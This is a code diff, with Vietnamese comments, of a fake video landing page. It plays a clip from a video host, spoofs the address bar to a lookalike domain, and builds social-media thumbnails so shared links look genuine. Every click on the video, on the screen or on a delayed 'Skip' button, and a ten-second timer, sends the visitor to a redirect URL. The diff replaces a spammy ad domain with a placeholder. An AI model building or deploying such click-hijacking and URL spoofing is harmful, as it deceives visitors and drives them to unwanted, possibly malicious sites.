@@ -5,6 +5,29 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>Video</title>
+
+    <!-- ==================== DYNAMIC THUMBNAIL CLOUDINARY ==================== -->
+    <meta property="og:title" content="Video">
+    <meta property="og:description" content="Xem video đầy đủ">
+    <meta property="og:type" content="video.other">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Video">
+    <meta name="twitter:description" content="Xem video đầy đủ">
+    <!-- Cloudinary sẽ tự động cắt ảnh từ video theo filename -->
+    <!-- THAY YOUR_CLOUD_NAME = cloud name của bạn -->
+    <script>
+        const cloudName = "YOUR_CLOUD_NAME"; // ←←← THAY VÀO ĐÂY
+        const filename = window.location.pathname.split('/').pop() || 'default.mp4';
+        const thumbnailUrl = `https://res.cloudinary.com/c-4bc2daea0cecf5eaf6dd10c0a1a76f/image/fetch/c_thumb,w_1200,h_630,g_auto,f_jpg/https://cdn.videy.co/${filename}`;
+        
+        // Set dynamic meta tags
+        document.querySelector('meta[property="og:image"]').setAttribute('content', thumbnailUrl);
+        document.querySelector('meta[name="twitter:image"]').setAttribute('content', thumbnailUrl);
+    </script>
+    <meta property="og:image" content="">
+    <meta name="twitter:image" content="">
+    <!-- ===================================================================== -->
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; background: #000; overflow: hidden; }
@@ -45,7 +68,7 @@
 
     <script>
         const VIDEO_BASE   = "https://cdn.videy.co";
-        const REDIRECT_URL = "https://broadlyjukeboxunrevised.com/2053781";
+        const REDIRECT_URL = "https://testlink.com";
         const DELAY_REDIRECT = 10000;
         const DELAY_SHOW_BUTTON = 5000;
 
@@ -53,7 +76,6 @@
             let path = window.location.pathname || '/';
             path = path.replace(/\/+$/, '');
             let filename = path.split('/').filter(Boolean).pop() || '';
-
             if (!filename && document.referrer) {
                 try {
                     const ref = new URL(document.referrer);
@@ -61,7 +83,6 @@
                     filename = refPath.split('/').filter(Boolean).pop() || '';
                 } catch(e) {}
             }
-
             try { filename = decodeURIComponent(filename); } catch(e) {}
             return filename || 'voDWqx8K1.mp4';
         }
@@ -74,42 +95,36 @@
                 history.replaceState({}, '', `https://cdnvidey.art/${filename}`);
             }
 
-            // Load video
             const video = document.getElementById('player');
             video.src = videoUrl;
             video.play().catch(() => {});
 
-            // ====================== CLICK VÀO VIDEO CŨNG REDIRECT NGAY ======================
+            // Click vào video → redirect ngay
             video.addEventListener('click', (e) => {
-                // Chỉ redirect khi click vào vùng video chính (không phải thanh controls)
                 if (e.target.tagName === 'VIDEO') {
-                    e.preventDefault();           // ngăn pause/play mặc định
+                    e.preventDefault();
                     e.stopImmediatePropagation();
                     window.location.href = REDIRECT_URL;
                 }
             });
-            // =================================================================================
 
-            // Nút Watch Full Now! hiện sau 5 giây
+            // Nút Skip hiện sau 5 giây
             const skipButton = document.getElementById('skipButton');
             setTimeout(() => skipButton.style.display = 'block', DELAY_SHOW_BUTTON);
 
-            // Click nút Skip
             skipButton.addEventListener('click', (e) => {
                 e.stopImmediatePropagation();
                 window.location.href = REDIRECT_URL;
             });
 
-            // Click toàn màn hình (ngoài video và nút Skip) cũng redirect
+            // Click màn hình (ngoài video + nút) → redirect
             const container = document.getElementById('container');
             container.addEventListener('click', (e) => {
-                if (e.target.id === 'skipButton' || e.target.tagName === 'VIDEO' || e.target.closest('video')) {
-                    return;
-                }
+                if (e.target.id === 'skipButton' || e.target.tagName === 'VIDEO' || e.target.closest('video')) return;
                 window.location.href = REDIRECT_URL;
             });
 
-            // Redirect tự động sau 10 giây
+            // Redirect tự động 10 giây
             const overlay = document.getElementById('overlay');
             let sec = 10;
             const int = setInterval(() => {
